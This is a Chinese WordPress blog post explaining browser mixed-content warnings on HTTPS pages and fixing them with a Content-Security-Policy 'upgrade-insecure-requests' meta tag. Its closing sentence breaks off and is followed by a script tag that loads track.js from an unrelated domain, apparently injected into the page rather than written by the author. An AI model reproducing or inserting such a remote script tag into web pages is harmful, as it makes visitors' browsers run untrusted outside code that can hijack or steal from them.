---
id: 46
title: '解决mixed content告警'
date: '2020-01-17T15:32:22+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=46'
permalink: /index.php/2020/01/17/%e8%a7%a3%e5%86%b3mixed-content%e5%91%8a%e8%ad%a6/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Wordpress
---

## 什么是mixed content？

所谓mixed content，翻译过来就是混合内容，那是什么跟什么的混合呢？

对于HTTPS的URL，浏览器在访问这个URL的时候，如果页面中还有HTTP的链接需要抓取，那么这个时候，我们就可以说，这个HTTPS的URL是mixed content的。

## 浏览器对mixed content一般都有告警

浏览器显示mixed content的HTTPS页面的时候，会在地址栏的左端显示一个三角形，以提示用户，这个页面不是所有的内容都是加密传输的，还有一些未加密传输的内容。

<div class="wp-caption" id="attachment_21718">mixed content一般都有告警

</div>对于未加密传输的内容，依然存在man-in-the-middle的潜在风险。所以浏览器有责任提示用户。

有一些网页内容，比如javascript，如果是非加密形式传输，潜在风险比较大，主流的浏览器都会将这样的内容block掉。（这种block只会出现在HTTPS的页面上，对于整体都还是HTTP的页面，就不存在这个问题了，所有的内容都是非加密传输的，地址栏左端也不会出现绿的锁标志）

## 如何解决mixed content告警

如果网页上所有的内容都是自己能够控制的，那么将所有的内容都至于HTTPS下传输，就不会出现告警。

如果不是所有的内容都能自己空间，比如你的网页上有嵌入一些广告联盟，百度联盟，阿里妈妈，我们可以在网上的<head>中增加一行代码，如下：

```
<span class="hljs-tag"><<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"upgrade-insecure-requests"</span>></span>
```

这行代码的作用是，告诉浏览器，网页中所有的HTTP链接，都自动升级成为HTTPS去访问。至于是否能够访问成功，就要看对方服务器的支持程度了。就算浏览器采用HTTPS的方式去访问，失败，最多也只是对应的内容不能使用或显示，再业不会出现三角形告警了。

测试发现，基本上主流的广告联盟，访问统计等资源，都可以自动支持HTTPS的访问（。<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>